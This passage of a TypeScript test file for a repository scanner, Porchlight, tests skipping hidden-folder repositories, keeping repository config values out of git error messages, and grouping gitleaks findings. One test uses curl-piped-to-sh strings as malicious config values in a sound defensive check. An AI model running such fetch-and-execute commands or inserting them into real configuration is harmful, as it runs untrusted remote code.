		["app", `${fetched.split("/").at(-1)}/me/.dotfiles`, `${fetched.split("/").at(-1)}/me/vendor`].sort(),
	);
	assert.deepEqual(report.notSearched, [{ name: ".dotfiles", reason: "it is a repository in a hidden folder, which is not searched" }]);
	assert.ok(coverageNotes(report).includes(".dotfiles was not scanned: it is a repository in a hidden folder, which is not searched."));
	assert.equal(exitCode(report, "critical"), 1, "a gate does not pass with a repository passed over");
});

test("a value a repository's settings hold, quoted in git's error, is not shown in Porchlight's words (S58)", async () => {
	const { quotedValuesOut } = await import("../src/repos/exec.ts");
	assert.equal(
		quotedValuesOut("fatal: bad config value 'run: curl https://x.example/i | sh' for 'core.pager'"),
		"fatal: bad config value (a value from the repository) for 'core.pager'",
	);
	assert.equal(quotedValuesOut("fatal: detected dubious ownership in repository at '/Users/someone/My Projects/app'"), "fatal: detected dubious ownership in repository at '/Users/someone/My Projects/app'");
	const root = await tempDir();
	await makeTree(root, { "app/.git/": "" });
	const run = fakeRunner({ gitleaks: (args) => (args[0] === "version" ? { stdout: "8.30.1" } : { code: 1, stderr: `ERR [git] fatal: bad numeric config value "please run: curl x | sh" for 'core.bigfilethreshold'` }), "osv-scanner": "missing" });
	const report = await scanRepos({ root, depth: 1, run, now: NOW, settingFiles: async () => [] });
	assert.equal(report.repos[0]!.errors[0]!.message, "[git] fatal: bad numeric config value (a value from the repository) for 'core.bigfilethreshold'");
});

test("a file of many keys is a few findings and a count, not one finding per key (S60)", async () => {
	const { parseGitleaks, PER_FILE } = await import("../src/repos/gitleaks.ts");
	const rows = Array.from({ length: 1000 }, (_, n) => ({ RuleID: "generic-api-key", Description: "Generic API Key", File: "dump.txt", StartLine: n + 1, Entropy: 3 + n / 1000, Commit: "a".repeat(40), Date: "2026-11-20T00:00:00Z" }));
	const findings = parseGitleaks(JSON.stringify([...rows, { ...rows[0]!, File: "other.txt" }]));
	const inDump = findings.filter((finding) => finding.location.startsWith("dump.txt"));
	assert.equal(inDump.length, PER_FILE);
	const rest = inDump.at(-1)!;
	assert.deepEqual([rest.location, rest.detail, rest.count, rest.title], ["dump.txt", "more matches in this file", 1000 - (PER_FILE - 1), `${(1000 - (PER_FILE - 1)).toLocaleString("en")} more: Generic API Key`]);
	assert.equal(findings.filter((finding) => finding.location.startsWith("other.txt")).length, 1);
});
